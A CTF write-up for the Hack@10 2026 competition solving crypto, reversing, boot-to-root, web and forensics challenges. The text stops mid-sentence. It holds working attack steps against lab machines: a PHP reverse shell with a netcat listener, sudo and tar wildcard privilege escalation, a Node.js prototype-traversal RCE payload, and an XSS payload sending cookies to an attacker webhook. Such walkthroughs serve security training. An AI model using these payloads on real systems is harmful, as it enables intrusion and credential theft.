# Hack@10 CTF 2026 – Writeup

**Author:** Mohammad Azri Bin Aziz (Irza_Chad)  
**Collaborators:** Zaim (M@ngkuk), Kamil

## Executive Summary

### Solves Overview

| Category        | Challenge             | Difficulty | Points | Solver | Flag Status |
| :-------------- | :-------------------- | :--------- | :----- | :----- | :---------- |
| **Crypto**      | `baby crypto`         | Warmup     | 252    | Azri   | Captured    |
| **Rev**         | `easy re 2`           | Medium     | 458    | Azri   | Captured    |
| **Boot 2 Root** | `Freshman-V2 - user`  | Medium     | 395    | Azri   | Captured    |
| **Boot 2 Root** | `Freshman-V2 - root`  | Medium     | 400    | Azri   | Captured    |
| **Boot 2 Root** | `Library-V2 - user`   | Medium     | 424    | Azri   | Captured    |
| **Boot 2 Root** | `Library-V2 - root`   | Medium     | 436    | Azri   | Captured    |
| **Web**         | `Phantom Relay`       | Hard       | 467    | Azri   | Captured    |
| **Web**         | `Pokédex Network`     | Hard       | 480    | Azri   | Captured    |
| **Misc**        | `I Accept`            | Warmup     | 185    | Azri   | Captured    |
| **Rev**         | `easy re`             | Easy       | 494    | Zaim   | Captured    |
| **Mobile**      | `protonx1337`         | Easy       | 488    | Zaim   | Captured    |
| **Forensics**   | `Dear Hiring Manager` | Medium     | 461    | Zaim   | Captured    |
| **Crypto**      | `Hakari Domain`       | Medium     | 100    | Zaim   | Captured    |
| **Misc**        | `Ancient Text`        | Warmup     | 100    | Zaim   | Captured    |
| **Rev**         | `registries`          | Medium     | 461    | Zaim   | Captured    |
| **Rev**         | `detonator`           | Medium     | 461    | Zaim   | Captured    |
| **Forensic**    | `MEOWWW`              | Easy       | 461    | Kamil  | Captured    |
| **Forensic**    | `malware.doc`         | Easy       | 185    | Kamil  | Captured    |

---

## Category: Cryptography

### 1. Challenge Overview: baby crypto

- **Category:** Cryptography
- **Difficulty:** Warmup
- **Points:** 252
- **Goal:** Decrypt a custom cipher that utilizes SHA-512 hashing, substring extraction, and random padding to recover the original plaintext flag.

### 2. Initial Analysis

The challenge provided a Python script (`chal.py`) and its resulting binary output (`output`). Source code review revealed the following encryption pipeline:

1. The script iterates over the plaintext flag in 2-character chunks.
2. It computes a SHA-512 hash for each chunk.
3. It extracts a random substring of that hash (ensuring a minimum length of 75 characters).
4. It prepends this substring with a random sequence of hex padding (0-31 bytes).

### 3. Thought Process

SHA-512 is obviously secure, but the key issue here is entropy. Since the script only hashes 2-character ASCII chunks at a time, there are only $256 \times 256 = 65,536$ possible values. This is tiny.

Instead of trying to "break" the hash, I can just precompute all possible 2-byte hashes and map them back to the plaintext. It's a textbook rainbow table attack. The 75+ character substrings are more than enough to uniquely identify each chunk.

### 4. Core Idea

**Low Entropy Hashing:** Hashing short, predictable inputs makes the algorithm's strength irrelevant. A simple lookup table wins every time.

### 5. Exploitation Steps

1. Read the binary `output` file and convert the contents to a hexadecimal string representation.
2. Develop a Python script to precompute the SHA-512 hashes for all possible 1-character and 2-character printable ASCII combinations.
3. Implement a greedy sliding-window algorithm to parse the output hex string:
   - Skip forward to bypass potential random padding.
   - Cross-reference the sliding window against the precomputed hash dictionary.
   - Upon detecting a minimum 75-character substring match, append the corresponding 2-byte plaintext to the recovered string buffer.

### 6. Getting the Flag

Running the decryption script successfully reconstructed the flag chunks.
`hack10{a88dacd5fb88dc4973bb3a56fff9be940bb1f1b83c2b82f3f6daa256267c9786f4cdc70255079e3cfaea9956211e615fe78ee9d5a95a832afff2f09b05c39db4}`

#### Solution Script (`solve.py`):

```python
import hashlib
import binascii
import string
import os

def solve():
    # Set the correct working directory to avoid issues
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    with open("output", "rb") as f:
        data = f.read().hex()

    # Precompute hashes
    # We need all 2-character and 1-character combinations (ASCII printable)
    chars = string.printable.encode()
    hashes = {}

    print("Precomputing SHA512 hashes...")
    # 2-character chunks
    for i in chars:
        for j in chars:
            chunk = bytes([i, j])
            hashes[chunk] = hashlib.sha512(chunk).hexdigest()

    # 1-character chunks (for the end if length is odd)
    for i in chars:
        chunk = bytes([i])
        hashes[chunk] = hashlib.sha512(chunk).hexdigest()

    flag = b""
    offset = 0
    while offset < len(data):
        found = False
        # Try all combinations
        for chunk, h in hashes.items():
            # pad is 0-31 bytes = 0-62 hex chars, and it's always even (hexlify)
            for p_chars in range(0, 63, 2):
                if offset + p_chars >= len(data):
                    break

                # Check for each b in 1..15
                for b in range(1, 16):
                    # Min length of cipher[b:a] is a-b where a >= 90.
                    # Min length is 90-b. At b=15, min length is 75.
                    if offset + p_chars + 75 > len(data):
                        continue

                    sub_min = h[b:b+75]
                    if data[offset+p_chars : offset+p_chars+75] == sub_min:
                        # Found a potentially valid substring!
                        # Now find the actual 'a' such that it matches the longest possible data
                        best_a = 90
                        for a in range(90, 129):
                            if offset + p_chars + (a-b) > len(data):
                                break
                            if data[offset+p_chars : offset+p_chars+(a-b)] == h[b:a]:
                                best_a = a
                            else:
                                break

                        flag += chunk
                        old_offset = offset
                        offset += p_chars + (best_a - b)
                        found = True
                        print(f"[{old_offset:04d} -> {offset:04d}] Found: {chunk.decode(errors='ignore')}, pad: {p_chars}, b: {b}, a: {best_a}, flag: {flag.decode(errors='ignore')}")
                        break
                if found: break
            if found: break

        if not found:
            print(f"Failed at offset {offset}")
            break

    print(f"\nFinal flag: {flag.decode(errors='ignore')}")

if __name__ == "__main__":
    solve()
```

---

## Category: Reverse Engineering

### 1. Challenge Overview: easy re 2

- **Category:** Reverse Engineering
- **Difficulty:** Medium
- **Points:** 458
- **Goal:** Defeat a multi-layered, AES-GCM protected Android packer and exploit a fallback cryptographic flaw to decrypt an asset.

### 2. Initial Analysis

This sequel challenge utilized an upgraded variant of the `ProxyApplication` packer. The payload was no longer protected by a static XOR, but by AES/GCM/NoPadding. The cryptographic key and nonce were dynamically derived from the `classes.dex` header.

### 3. Thought Process

After successfully scripting the AES-GCM key derivation and extracting the inner APK, I examined the `ImageEncryptor` class. The application still utilized a native C++ library for primary encryption, but crucially, the developer included a Java-layer fallback method in the event the native library failed to initialize:

```java
result[i] = (byte) (data[i] ^ (-559038737));
```

I hypothesized that the author used this fallback to generate the challenge files. Casting the 32-bit integer `-559038737` (`0xDEADBEEF`) to a single byte truncates it to `0xEF`.

### 4. Core Idea

**Weak Fallbacks:** Even if you use native AES, a hardcoded XOR fallback (using `0xEF`) completely ruins the security. It's a classic "worst of both worlds" scenario.

### 5. Exploitation Steps

1. **Unpacking:** Extracted the AES-GCM key from the first 4096 bytes of the original `classes.dex` and decrypted the inner payload.
2. **Verification:** Tested the first three bytes of `background.bkp` against `0xEF`. The output yielded `FF D8 FF`, confirming the presence of a valid JPEG header.
3. **Decryption:** Scripted a Python routine to XOR the entire `background.bkp` file against the `0xEF` constant, writing the output to a new image file.

### 6. Getting the Flag

The decrypted image rendered the character Minato Namikaze, with text fragments pointing sequentially to the flag.

![Minato Namikaze Decrypted Image](easy_re2.jpg)

`hack10{minato_namikaze}`

---

## Category: Boot 2 Root

### 1. Challenge Overview: Freshman-V2 - user

- **Category:** Boot 2 Root
- **Difficulty:** Medium
- **Points:** 395
- **Goal:** Establish an initial foothold on the target machine (`10.0.2.3`) and secure low-privileged user access.

### 2. Initial Analysis

Network enumeration via Nmap revealed an Apache web server on port 80 hosting a custom "Freshman Portal." Directory brute-forcing via Gobuster discovered an authenticated endpoint at `/upload.php` and a directory at `/uploads/`.

### 3. Thought Process

The portal needed a login. I tried the classic `admin:admin` and it worked immediately—always worth a shot before diving into SQLi.
Once in, the `/upload.php` page mentioned PDF/DOCX, but there was no actual server-side validation. I tried uploading a standard PHP reverse shell, and it went straight through.

### 4. Core Idea

**Unrestricted File Upload:** No extension filtering on an upload form leads directly to RCE.

### 5. Exploitation Steps

1. Authenticated to the web portal using `admin:admin`.
2. Uploaded a PHP reverse shell payload.
3. Established a local Netcat listener (`nc -lvnp 1234`) and triggered the payload by navigating to `http://10.0.2.3/uploads/shell.php`.
4. As the `www-data` user, enumerated local temporary directories. Discovered `/tmp/dev_notes.txt`, which leaked the SSH credentials: `freshman` / `freshman123`.
5. Upgraded the shell to a fully interactive TTY using Python and pivoted to the `freshman` account using the `su` command.

### 6. Getting the Flag

Read the user flag from the home directory.
`hack10{3asy_p3asy_1n1t1al_acc3ss}`

---

### 1. Challenge Overview: Freshman-V2 - root

- **Category:** Boot 2 Root
- **Difficulty:** Medium
- **Points:** 400
- **Goal:** Escalate privileges from the compromised `freshman` account to `root`.

### 2. Initial Analysis

Once I had an SSH shell as `freshman`, I started looking around the box. I checked for SUIDs and sudo permissions.

### 3. Thought Process

`sudo -l` showed exactly what I was looking for:

```text
(ALL) NOPASSWD: /usr/bin/find
```

The `find` command has an `-exec` flag that lets you run shell commands. Since it was running as root without a password, I just used it to spawn a bash shell.

### 4. Core Idea

**Sudo Misconfig:** Running binaries like `find` as root via sudo is an easy privilege escalation vector (GTFOBins).

### 5. Exploitation Steps

1. Executed the `find` binary using `sudo`, appending the `-exec` flag to spawn a Bash shell:
   ```bash
   sudo /usr/bin/find . -exec /bin/bash \; -quit
   ```
2. The command executed successfully, dropping an interactive root terminal.
3. Navigated to `/root` to secure the final flag.

### 6. Getting the Flag

Read and decoded the root flag from the administrative directory.
`hack10{r00t_pr1v3sc_v1a_s0ud0_f1nd_w00t}`

---

### 1. Challenge Overview: Library-V2 - user

- **Category:** Boot 2 Root
- **Difficulty:** Medium
- **Points:** 424
- **Goal:** Enumerate network services on the target (`10.0.2.4`) to extract credentials and gain initial access.

### 2. Initial Analysis

A quick nmap scan showed FTP (Port 21) running `vsftpd`. I checked for anonymous login and it was enabled, giving me access to a `public` directory.

### 3. Thought Process

Anonymous FTP is always a good first check. I logged in and found a hidden file `.secret_note.txt` in the `public` folder. It contained the SSH password for the `librarian` user: `Shhh!KeepQuiet`.

### 4. Core Idea

**Insecure Defaults:** Leaving anonymous FTP enabled with sensitive notes accessible is an easy win for attackers.

### 5. Exploitation Steps

1. Connected to the FTP service using the `anonymous` credential.
2. Navigated to the `public` directory and retrieved `.secret_note.txt`.
3. Read the note to extract the credentials: `librarian` / `Shhh!KeepQuiet`.
4. Initiated an SSH connection to Port 22 using the compromised credentials, successfully gaining a foothold on the target machine.

### 6. Getting the Flag

Extracted the user flag from `/home/librarian`.
`hack10{4n0nym0u5_ftp_t0_55h_w00t}`

---

### 1. Challenge Overview: Library-V2 - root

- **Category:** Boot 2 Root
- **Difficulty:** Medium
- **Points:** 436
- **Goal:** Exploit an automated system task to escalate privileges from `librarian` to `root`.

### 2. Initial Analysis

I checked for SUIDs and sudo perms again, but nothing stood out. Then I checked `/etc/crontab` and found a root cron job running `/root/backup.sh` every minute.

### 3. Thought Process

Further investigation of the `/var/backups` directory showed a file, `books.tar`, actively updating its timestamp every 60 seconds. This indicated the backup script was executing a `tar` command against the `/home/librarian/books` directory, an area over which my low-privileged user had write authority.

The presence of an automated `tar *` command creates a severe vulnerability. The shell expands the `*` wildcard into all file names within the directory before passing them to the binary. If files are intentionally named starting with `--`, `tar` interprets them as operational flags rather than files.

### 4. Core Idea

**Wildcard Injection:** The `tar *` wildcard is a classic exploit. Since `tar` treats filenames starting with `--` as arguments, I can inject commands into the cron job.

### 5. Exploitation Steps

1. Navigated to the targeted backup directory: `cd ~/books`.
2. Authored a payload script (`shell.sh`) designed to copy the Bash binary to `/tmp` and set the SUID bit:
   ```bash
   echo '#!/bin/bash' > shell.sh
   echo 'cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell' >> shell.sh
   chmod +x shell.sh
   ```
3. Generated the malicious argument files to exploit the wildcard expansion:
   ```bash
   touch "./--checkpoint=1"
   touch "./--checkpoint-action=exec=sh shell.sh"
   ```
4. Waited for the cron job to execute at the turn of the minute.
5. Executed the newly spawned SUID binary (`/tmp/rootshell -p`) to inherit root privileges.

### 6. Getting the Flag

Captured the root flag from the secure directory.
`hack10{cr0n_t4r_w1ldc4rd_1nj3ct10n_ftw}`

---

## Category: Web Exploitation

### 1. Challenge Overview: Phantom Relay

- **Category:** Web Exploitation
- **Difficulty:** Hard
- **Points:** 467
- **Goal:** Exploit a custom JSON evaluation engine within a Next.js portal to achieve Remote Code Execution (RCE).

### 2. Initial Analysis

The app was a Next.js marketplace dashboard. The main UI was locked, but checking the Webpack JS chunks (revealed in the network tab on `/login`) showed a debugging memo with hardcoded admin creds: `admin` / `phantom_op_88`.

### 3. Thought Process

Authenticating via a manipulated session cookie (`phantom_auth=valid_session`) granted access to the `/relay` API dashboard. The API accepted POST requests containing a JSON array of `instructions`.

An internal incident report leaked in another JS bundle highlighted an auditor's concern regarding the `$@X` operator and "walking up the object tree," which the developer had summarily dismissed.

Manual API fuzzing revealed the engine's behavior:

- `$N` resolves to the array index.
- Dot notation (`$0.prop`) allows property access.
- `$@X` evaluates the element at index `X` as a JavaScript function, passing element `X-1` as its argument.

By chaining dot notation, I could execute a prototype traversal. In JavaScript, accessing `"".constructor.constructor` traverses the object prototype chain up to the global `Function` object, which is capable of compiling and executing arbitrary string data as server-side code.

### 4. Core Idea

**Prototype Traversal to RCE:** JS prototype chains are a powerful vector. Using `"".constructor.constructor` lets you access the `Function` global and execute arbitrary code.

### 5. Exploitation Steps

1. Bypassed UI authentication by manually setting the leaked cookie.
2. Constructed a malicious JSON instruction array utilizing the `$@X` operator to compile a Node.js filesystem command:

   ```json
   {
     "instructions": [
       "return process.mainModule.require('fs').readFileSync('/app/flag.txt','utf8')",
       "$0.constructor.constructor",
       "$@1",
       "$@2"
     ]
   }
   ```

   - **Index 0:** The Node.js payload string.
   - **Index 1:** The prototype walk to secure the `Function` object.
   - **Index 2:** Uses `$@1` to execute `Function(code)`, returning the compiled anonymous function.
   - **Index 3:** Uses `$@2` to execute the compiled function, triggering RCE.

### 6. Getting the Flag

The API returned the result of the filesystem read in the JSON response array.
`hack10{ph4nt0m_r3l4y_3scap3d}`

---

### 1. Challenge Overview: Pokédex Network

- **Category:** Web Exploitation
- **Difficulty:** Hard
- **Points:** 480
- **Goal:** Bypass a stringent Content Security Policy and a Tomcat WAF to execute a zero-click XSS payload, exfiltrating an administrative bot's session cookie.

### 2. Initial Analysis

The app had a `/report` feature that sent URLs to an admin bot (Puppeteer). I noticed that 404 pages reflected the URL path inside an anchor tag: `<a href='/[input]' class='...'>`.

The Tomcat server was filtering `<` and `>`, so standard tags were out.

### 3. Thought Process

While bracket tags were filtered, single quotes (`'`) were processed normally. By submitting a path like `/test'onclick='alert(1)`, I successfully broke out of the `href` attribute and injected a custom HTML event handler.

However, an `onclick` handler requires user interaction, which an automated Puppeteer bot will not provide. The payload required auto-execution. Because the application natively loaded Tailwind CSS, I injected the utility class `animate-spin`. Forcing the anchor tag to immediately animate allowed the use of the `onanimationstart` event handler to achieve zero-click execution.

The final hurdle was the Tomcat WAF, which blocked spaces and complex characters required for a functional JavaScript exfiltration payload. To evade this, I placed the actual execution code inside the URL fragment (`#`). The URL fragment is processed purely client-side by the DOM and is never transmitted to the backend server, entirely bypassing the WAF.

### 4. Core Idea

**WAF Evasion & XSS:** Bypassing backend filters by using CSS-triggered event handlers (`onanimationstart`) and hiding the final payload in the URL fragment (`#`).

### 5. Exploitation Steps

1. Crafted the breakout payload to inject the CSS class and event handler:
   `'class='animate-spin'onanimationstart='eval(location.hash.slice(1))'`
2. Appended the URL fragment containing the exfiltration logic:
   `#window.location='https://[attacker-webhook]/?c='+btoa(document.cookie)`
3. Submitted the full concatenated URL to the `/report` endpoint.
4. The Admin bot navigated to the link. The WAF permitted the path, reflecting the payload. Tailwind CSS triggered the animation, executing the `eval()` statement which read and executed the fragment, exfiltrating the Base64 encoded cookie.

### 6. Getting the Flag

Decoded the intercepted Base64 string from the webhook logs to reveal the flag.
`hack10{d1d_y0u_gueXSS_1t?}`

---

## Category: Miscellaneous

### 1. Challenge Overview: I Accept

- **Category:** Misc / Web Exploitation
- **Difficulty:** Warmup
- **Points:** 185
- **Goal:** Locate the flag hidden within a 50-clause Terms of Service document for the BlackVault User Agreement.

### 2. Initial Analysis

The challenge presented a standard "Terms and Conditions" web page. Reconnaissance was initiated by inspecting the HTML structure (`index.html`) using browser Developer Tools (F12). Initial source code review revealed two critical developer comments serving as breadcrumbs:

1. `<!-- [HINT 1] "The truth is hidden in the layers." -->`
2. `<!-- [HINT 2] "Clause 12 holds a hidden character." -->`

### 3. Thought Process

The hints suggested that information was layered and hidden within individual characters. Examining Clause 12 ("Users must always **с**onsent to periodic a**ѕѕ**essments.") revealed that the letters `c` and `ss` were Cyrillic homoglyphs. Compiled together, they spelled `css`, redirecting the investigation toward the external stylesheet. The strategy then shifted to locating flag fragments hidden via CSS property abuse (opacity, color matching, and `display: none`).

### 4. Core Idea

**Client-Side Obfuscation:** Hiding secrets in CSS or through homoglyphs doesn't work if someone actually looks at the source code.

### 5. Exploitation Steps

1. **Source Enumeration:** Discovered two flag fragments hidden in the HTML source:
   - **Fragment 2 (Clause 19):** `<span class="invisible-fragment">pr1nt_</span>` (Hidden by matching the document's background color).
   - **Fragment 3 (Footer):** `<div class="legal-footnote">n3v3rr_l13ss}</div>` (Removed from flow via `display: none`).
2. **Identifying Injection Point:** Detected an empty paragraph in Appendix B (`<p id="appendix-b">`) designated for supplementary notices.
3. **CSS Forensic Analysis:** Analyzed `style.css` and identified the first fragment being injected via a pseudo-element:
   ```css
   #appendix-b::after {
     content: " hack10{f1n3_";
     font-size: 0;
     opacity: 0;
   }
   ```
4. **Reconstruction:** Combined the injected content and the unscoped HTML fragments in their logical document order.

### 6. Getting the Flag

By assembling the extracted fragments, the full flag was recovered.
`hack10{f1n3_pr1nt_n3v3rr_l13ss}`

---

## Contributor Writeups: Zaim (M@ngkuk)

### Contributor Writeups: Kamil

- **MEOWWW:** Forensic — authored the MEOWWW analysis and extraction steps (flag: `hack10{p0w3r_d3c0d3}`).
- **malware.doc:** Forensic — discovered the external relationship IoC URL and reported the flag (hack10{https://happy.divide.cloud/nowyouknow.html}).

### 1. Challenge Overview: easy re

- **Category:** Reverse Engineering
- **Difficulty:** Easy
- **Points:** 494
- **Goal:** Defeat a multi-layered APK packer and recover a flag hidden within a pre-encrypted asset using known-plaintext analysis.

### 2. Initial Analysis

I started by opening `chall.apk` in **jadx**. The `MainActivity` was almost empty, but the `ProxyApplication` class revealed a classic **APK packer** logic. It reads `classes.dex`, extracts a payload, and decrypts it using a simple XOR `0xFF` operation before loading it via `DexClassLoader`.

### 3. Thought Process

After unpacking the `payload.apk`, I found a login form in `MainActivity`. The code had a logical flaw: if both username and password fields are empty, the login check succeeds because `md5("") == md5("")`.
Upon "logging in," the app uses a native library to encrypt images. I found a pre-encrypted file `assets/background.bkp` and its plaintext equivalent `assets/background.txt` (base64 JPEG). This was a perfect setup for a **known-plaintext attack**.

### 4. Core Idea

**Known-Plaintext XOR Recovery:** Since the encryption is a repeating XOR cipher and I have both the original file and the encrypted version, I can recover the key by simply XORing the two files.

### 5. Exploitation Steps

1. **Unpacking:** Wrote a Python script to extract the payload from `classes.dex` and decrypt it using `b ^ 0xFF`.
2. **Key Recovery:** XORed the decoded JPEG from `background.txt` with the bytes in `background.bkp`. This revealed a repeating **32-byte XOR key**.
3. **Decryption:** Used the recovered key (`e7c35ac886acdbfe...`) to decrypt the entire background image.
4. **Flag Isolation:** The decrypted image was a JPEG with the flag written in red text. I used a Python script with **PIL** and **numpy** to isolate the red channel and make the text readable.

### 6. Getting the Flag

The isolated red text clearly showed the flag:

![Decrypted background with red flag text](easy_re1.png)

`hack10{t3r_ez_x0rs}`

---

### 1. Challenge Overview: protonx1337

- **Category:** Mobile / Reverse Engineering
- **Difficulty:** Easy
- **Points:** 488
- **Goal:** Identify and interact with a covert C2 server hidden inside a seemingly benign Android application.

### 2. Initial Analysis

Decompiling the app with `apktool`, I noticed the `debuggable="true"` flag in the manifest—a common red flag. The `onCreate` method in `MainActivity` called a suspicious `backdoorC2()` method.

### 3. Thought Process

The `backdoorC2` method was exfiltrating device metadata to a remote server. The strings for the C2 URL were split across multiple variables in `LiveLiterals$MainActivityKt` to avoid simple automated detection. By reassembling these strings, I found the target endpoint.

### 4. Core Idea

**Covert Exfiltration:** Malware often hides its C2 infrastructure by splitting strings or using indirection libraries like `LiveLiterals`. Checking the server-side components linked in the code can often reveal the flag.

### 5. Exploitation Steps

1. **Decompilation:** Used `apktool d` to get the smali source.
2. **String Reassembly:** Found the C2 URL pieces in `LiveLiterals`: `https://appsecmy.com/` + `pages/liga-ctf-2026`.
3. **Server Investigation:** Visited the assembled URL using `curl`.

### 6. Getting the Flag

I found the flag hidden as a comment in the HTML source of the C2 landing page.
`HACK10{j3mpu7_s3r74_0W4SP_C7F}`

---

### 1. Challenge Overview: Dear Hiring Manager

- **Category:** Forensics
- **Difficulty:** Medium
- **Points:** 461
- **Goal:** Analyze a malicious PDF file (`resume.pdf`) to extract the final payload.

### 2. Initial Analysis

Running `file` on the PDF showed it was a version 1.3 document, but the header `%QDF-1.0` indicated it had been processed with **QPDF**, making the objects human-readable.

### 3. Thought Process

I searched for common PDF triggers and found `/OpenAction` in the Catalog (Object 1). This pointed to Object 5, which contained a suspicious JavaScript block: `eval(atob(a.join("")+b.join("")))`.

### 4. Core Idea

**PDF JavaScript Injection:** Malicious PDFs often use `OpenAction` or `AA` (Additional Actions) to execute JavaScript immediately upon opening. Obfuscated payloads within these scripts are usually the key to the flag.

### 5. Exploitation Steps

1. **Triage:** Used a simple text editor/grep to find the `/OpenAction` trigger.
2. **Parsing JS:** Extracted the obfuscated string from Object 5: `"BOPCd0edrK 1i+mVBeXU8:ddd$"`.
3. **Decoding:** Noticing the special characters (colons, dollar signs), I realized it wasn't Base64 but **ASCII85**. I stripped the spaces and decoded the string.

### 6. Getting the Flag

The ASCII85 decoded string revealed the flag.
`hack10{M4l1ci0s_PDF}`

---

### 1. Challenge Overview: Hakari Domain

- **Category:** Cryptography
- **Difficulty:** Medium
- **Points:** 100
- **Goal:** Hit the jackpot by predicting PRNG outputs and then decrypting an RSA-encrypted flag using multiple samples.

### 2. Initial Analysis

The challenge provided a network service (`nc`) that leaked the actual 32-bit output of the PRNG every time a guess was wrong. It also offered RSA-encrypted samples of the flag whenever a 'jackpot' (streak of 3) was achieved.

### 3. Thought Process

The PRNG used was Python's `random` module (MT19937). Since the state of MT19937 consists of 624 32-bit words, harvesting 624 outputs allowed me to completely reconstruct the internal state. For the RSA part, the same message was encrypted with a small exponent (`e=17`) across different moduli, making it vulnerable to **Hastad's Broadcast Attack**.

### 4. Core Idea

**PRNG Cloning & CRT:** By "untempering" enough 32-bit outputs, an attacker can clone the Mersenne Twister state to predict all future values. Chaining this with the Chinese Remainder Theorem (CRT) on the RSA samples allows for perfect decryption without factoring `N`.

### 5. Exploitation Steps

1. **MT19937 Cloning:** Sent 624 wrong guesses to the server to collect the leaked outputs. Used an `untemper` function to recover the state and initialized a local `random.Random` object with it.
2. **Jackpot:** Predicted the next 3 values correctly to unlock the RSA sample generator.
3. **Data Collection:** Collected 17 RSA samples (`n_i`, `c_i`).
4. **CRT & Nth Root:** Applied the Chinese Remainder Theorem to the 17 samples. Since `m^17 < N`, I took the integer 17th root of the result to recover the plaintext.

### 6. Getting the Flag

The 17th root yielded the long integer representation of the flag.
`hack10{ab3a61603241b0638804acdc5f905cd4}`

---

### 1. Challenge Overview: Ancient Text

- **Category:** Miscellaneous
- **Difficulty:** Warmup
- **Points:** 100
- **Goal:** Decode a mysterious runic script found in an image.

### 2. Initial Analysis

The image contained angular, geometric symbols. Fans of modern anime recognized these as the **ancient magic script** from "Frieren: Beyond Journey's End."

### 3. Thought Process

The "ancient text" is a simple substitution cipher where each rune corresponds to a specific Latin letter. Mapping the runes in the second row of the image to the known Frieren alphabet revealed the plaintext.

### 4. Core Idea

**Cultural Reconnaissance:** Pop culture references are common in CTF "Misc" challenges. Identifying the source material (anime/games/movies) often provides the key to the cipher.

### 5. Exploitation Steps

1. **Identification:** Identified the runes as Frieren's magical script.
2. **Translation:** Used a fan-made reference sheet to translate the 8 symbols in the second row.
3. **Verification:** The first row was flavor text, but the second row perfectly spelled out a common word from the show.

### 6. Getting the Flag

The translated runes formed the flag word.
`hack10{zoltraak}`

---

### 1. Challenge Overview: registries

- **Category:** Reverse Engineering
- **Difficulty:** Medium
- **Points:** 461
- **Goal:** Recover the authorized email address from a hashed value inside a .NET binary.

### 2. Initial Analysis

The file `registries.exe` was a **.NET assembly**. Using `strings` revealed a remote URL containing a list of nearly 100,000 emails and a hardcoded MD5 hash: `0d103375d4f99df6bc92a931aa8f48b1`.

### 3. Thought Process

The program logic was simple: fetch the email list, ask the user for an email, hash it, and check if it matches the hardcoded target. Instead of trying to "crack" the MD5 hash directly, I could just iterate through the 100,000 emails provided in the author's own list.

### 4. Core Idea

**Dictionary Attack on Known Space:** When a hash is used to protect a value that exists within a known, finite list, the hash is effectively useless. Brute-forcing the list is near-instant.

### 5. Exploitation Steps

1. **Information Extraction:** Extracted the email list URL and the target MD5 hash from the binary.
2. **Downloading the List:** Fetched the 99,999 emails from the remote server.
3. **Brute-force Script:** Wrote a Python script to MD5-hash every email in the list (making sure to lowercase them as the binary does).
4. **Matching:** Found the email that matched the target hash.

### 6. Getting the Flag

The matching email address is the flag.
`HACK10{wa00d6d88epd0z1x6gro@rediffmail.com}`

---

### 1. Challenge Overview: detonator

- **Category:** Reverse Engineering
- **Difficulty:** Medium
- **Points:** 461
- **Goal:** Manipulate a Windows environment to satisfy a specific file-path condition in a native x86-64 binary.

### 2. Initial Analysis

The binary `detonator.exe` was a native Windows executable. Static analysis with `strings` revealed a fake flag and a very specific file path: `C:\Users\HACK10{fake_flag}\Desktop\local.txt`.

### 3. Thought Process

Disassembling the `check_flag()` function in **radare2** revealed that the binary checks if that specific file path exists using `_stat`. If it does, it computes the MD5 hash of the **path string itself** and prints it as the flag.

### 4. Core Idea

**Environment-Dependent Flags:** Some challenges require you to "simulate" a specific user environment to trigger the success condition. Understanding how native system calls (like `stat`) behave allows you to spoof the required files.

### 5. Exploitation Steps

1. **Static Analysis:** Recognized the DLL dependencies (MinGW runtimes) and the target path.
2. **Environment Setup:** Used **Wine** to run the binary on Linux. Created the required directory structure under `~/.wine/drive_c/Users/.../`.
3. **Execution:** Placed a dummy `local.txt` file in the destination and ran the binary.
4. **Verification:** The binary detected the file and printed the MD5(path).

### 6. Getting the Flag

The binary printed the final flag upon detecting the file.
`HACK10{be029cf0e9f2eaa5f80489343630befb}`

### 1. Challenge Overview: MEOWWW

- **Category:** Forensic
- **Difficulty:** Easy
- **Points:** 461
- **Goal:** Analyze the provided image evidence to uncover the hidden payload and retrieve the flag.

### 2. Initial Analysis

The provided file was chal.jpg. Initial static analysis using exiftool revealed completely clean metadata with no hidden tags. A quick scan with binwalk also showed standard JPEG image data with no obviously appended archives. However, the challenge description explicitly hinted at a "hidden payload," strongly suggesting the use of steganography to embed data directly within the image's bits.

### 3. Thought Process

Checking the image with steghide info confirmed the presence of embedded data with a capacity of 16.0 KB, but it was locked behind a passphrase. Since no obvious password was hidden in the strings or written on the image, brute-forcing the passphrase was the logical next step. Once the payload was extracted, it turned out to be an obfuscated PowerShell script, meaning the final step required reverse-engineering the script's unpacking routine rather than executing it.

### 4. Core Idea

**Environment-Dependent Flags:** Steganography and Payload Deobfuscation: Attackers frequently use steganography to smuggle malicious stagers past network defenses within benign-looking media. To further evade signature-based antivirus detection, these extracted payloads are often heavily obfuscated—commonly utilizing Base64 encoding combined with stream compression—requiring analysts to manually reconstruct the deobfuscation chain.

### 5. Exploitation Steps

1. Reconnaissance: Ran exiftool and binwalk on chal.jpg to rule out obvious metadata manipulation or appended files.

2. Steganography Brute-forcing: Used stegseek in conjunction with the rockyou.txt wordlist to attack the file. Successfully cracked the passphrase, which was "hidden".

3. Payload Extraction: stegseek automatically dropped the hidden payload, revealing it to be a PowerShell script originally named chal.ps1 (extracted as chal.jpg.out).

4. Code Analysis: Inspected the extracted script and identified an iex execution trap ($eNV:cOmSPEc). The core payload was a Base64 encoded string being decompressed via System.IO.Compression.DeflateStream.

5. Decoding: Bypassed the execution trap by manually decoding the Base64 string and applying raw deflate decompression
   'UzF19/UJV7BVUMpITM42NKguMCg3LopPMU42SDGuVQIA'(using CyberChef or a quick Python zlib/base64 script) to safely extract the plaintext.

### 6. Getting the Flag

Decompressing the PowerShell payload successfully revealed the hidden text.
`hack10{p0w3r_d3c0d3}`

Malware or not?
185
2 (100% liked) 0

Identify the suspicious URL that acts as an Indicator of Compromise (IoC) in the document.

Analyze the provided file within a controlled environment.

Flag format: hack10{url}

Author: Wh1teB3ar

1. Challenge Overview: malware.doc

- Category: Forensic
- Difficulty: Easy
- Goal: Identify the suspicious URL that acts as an Indicator of Compromise (IoC) in the document.

---

2. Initial Analysis

The provided file was malware.doc. Despite the .doc extension (implying a legacy Word Binary format), running file on
it immediately revealed it was actually a Microsoft OOXML file — a ZIP-based archive used by modern Office formats
(.docx). The file header confirmed this: PK\x03\x04 (ZIP magic bytes). The visible text content of the document was
minimal and innocuous: "Testing Im hacker" — nothing obviously suspicious at the surface level.

---

3. Thought Process

Since OOXML documents are ZIP archives containing XML files, the logical approach was to unzip the file and inspect its
internal components — particularly the relationship files (\_rels/\*.rels). These XML files define all resources the
document references, including external ones. Malicious documents frequently abuse the oleObject or attachedTemplate
relationship types to point to attacker-controlled infrastructure, causing the victim's machine to make an outbound
HTTP request on document open.

---

4. Core Idea

External Relationship Injection (OLE Object / Remote Template): Modern Office documents use .rels XML files to declare
relationships between document parts and external resources. Attackers embed a crafted external relationship (e.g.,
oleObject or attachedTemplate) pointing to a malicious URL. When the victim opens the document, Word silently fetches
the remote resource — enabling credential harvesting (NTLM hash capture), payload delivery, or C2 beacon triggering —
